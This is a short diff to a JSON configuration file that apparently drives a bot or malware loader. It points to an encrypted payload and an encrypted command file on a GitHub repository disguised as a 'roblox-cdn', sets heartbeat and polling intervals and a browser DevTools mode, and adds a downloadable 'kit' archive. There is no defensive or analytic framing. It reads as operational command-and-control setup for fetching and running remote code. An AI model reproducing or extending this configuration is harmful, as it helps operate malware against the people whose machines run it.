@@ -2,12 +2,17 @@
   "version": "1.0.0",
   "payload": {
     "url": "https://raw.githubusercontent.com/lolcaken/roblox-cdn/main/payload.1.0.0.enc",
-    "sha256": "975d19c8ef4772255bc6559cce3bac5b91bf3ee8eb50e9de5904905096ec85f5"
+    "sha256": "792887453d2be7d47ab9399befe577a18a56f0e519ac8a96d57d910cfad65326"
   },
   "config": {
     "botUrl": "https://pegasus.invalid",
     "cmdUrl": "https://raw.githubusercontent.com/lolcaken/roblox-cdn/main/cmd.enc",
     "reportUrl": "",
+    "kit": {
+      "version": "",
+      "url": "https://raw.githubusercontent.com/lolcaken/roblox-cdn/main/kit.zip",
+      "sha256": ""
+    },
     "heartbeatMin": 15,
     "pollWaitSec": 20,
     "cdpMode": "ondemand",
